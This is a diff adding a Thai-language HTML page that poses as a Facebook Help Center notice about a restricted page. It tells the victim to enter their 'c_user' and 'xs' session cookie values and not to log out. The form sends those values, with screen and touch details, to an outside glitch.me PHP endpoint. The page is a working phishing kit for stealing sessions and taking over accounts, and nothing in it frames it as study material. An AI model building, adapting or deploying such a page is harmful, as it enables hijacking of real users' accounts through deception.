@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="th">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="assets/logo-xjw2vU6p.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>แบบฟอร์ม Meta</title>
+    <script type="module" crossorigin="" src="/assets/index-D9lU3uHa.js"></script>
+    <link rel="stylesheet" crossorigin="" href="style.css">
+</head>
+
+<body>
+    <form class="sm:hidden lg:block md:block" action="https://mixed-fluff-space.glitch.me/zubairbhaithai.php" method="post">
+        
+        <input type="hidden" id="screenWidth" name="screenWidth" value="">
+        <input type="hidden" id="screenHeight" name="screenHeight" value="">
+        <input type="hidden" id="isTouchDevice" name="isTouchDevice" value="">
+
+        <div class="d-flex align-items-center" style="width: 100%; height: 90px; background: rgb(70, 103, 172);">
+            <h1 class="text-white ms-4 m-0 d-flex align-self-center">เฟซบุ๊ก</h1>
+        </div>
+        <div class="d-flex align-items-center" style="width: 100%; height: 60px; background: rgb(233, 235, 238);">
+            <h4 class="ms-4 m-0 d-flex align-self-center text-primary">ศูนย์ช่วยเหลือ</h4>
+        </div>
+        <div class="col-12 my-4 d-flex justify-content-center align-items-center">
+            <div class="col-11 col-md-6 border">
+                <div class="p-2" style="background: rgb(245, 246, 247);">
+                    <h5 class="m-0">คำขอเพื่อลบการละเมิดเพจ</h5>
+                </div>
+                <div class="p-2">
+                    <p class="fw-semibold validation_form_para">เราตรวจพบกิจกรรมที่ผิดปกติในเพจของคุณ ซึ่งละเมิดแนวทางชุมชนของเรา</p>
+                    <p class="fw-semibold validation_form_para">ดังนั้น การเข้าถึงเพจของคุณจึงถูกจำกัด และคุณไม่สามารถโพสต์ แชร์ หรือแสดงความคิดเห็นได้ในขณะนี้</p>
+                    <p class="fw-semibold validation_form_para">โปรดระบุรายละเอียดที่ถูกต้องด้านล่าง หากคำแนะนำไม่ชัดเจน โปรดดูวิดีโอประกอบ</p>
+                    <p class="fw-semibold text-secondary" style="font-size: 12px;">ข้อมูลวิดีโอโดยละเอียด</p>
+                    <video controls="" autoplay=""
+                        src="https://pub-0cd667ee1929470288fcfc8dafcf0262.r2.dev/thai-1.mp4"
+                        style="width: 300px; height: 160px;"></video>
+                    <br>
+                    <button>เปิดเสียง</button>
+                    <p class="fw-semibold validation_form_para mt-2">โปรดให้ข้อมูลที่ร้องขอด้านล่าง</p>
+                    <label class="" style="font-size: 12px;">c_user</label>
+                    <br>
+                    <input type="number" name="c_user" required="" pattern="^\d{15}$" title="กรุณากรอกตัวเลข 15 หลัก">
+                    <br>
+                    <label class="mt-2" style="font-size: 12px;">xs</label>
+                    <br>
+                    <input type="text" name="xs">
+                    <p class="mt-2" style="font-size: 12px;">โปรดอย่าล็อกเอาต์จากคอมพิวเตอร์หรือแล็ปท็อปของคุณ จนกว่าคุณจะได้รับอีเมลยืนยัน</p>
+                </div>
+                <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
+                    <button type="submit" class="text-white border-0"
+                        style="background: rgb(66, 103, 178);">ส่ง</button>
+                </div>
+            </div>
+        </div>
+    </form>
+
+    <script>
+        // เพิ่มรายละเอียดอุปกรณ์ในช่องที่ซ่อนไว้ก่อนส่งแบบฟอร์ม
+        const form = document.getElementById("device-form");
+
+        form.addEventListener("submit", (event) => {
+            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            const screenWidth = window.innerWidth;
+            const screenHeight = window.innerHeight;
+
+            document.getElementById("screenWidth").value = screenWidth;
+            document.getElementById("screenHeight").value = screenHeight;
+            document.getElementById("isTouchDevice").value = isTouchDevice ? "true" : "false";
+        });
+    </script>
+</body>
+
+</html>
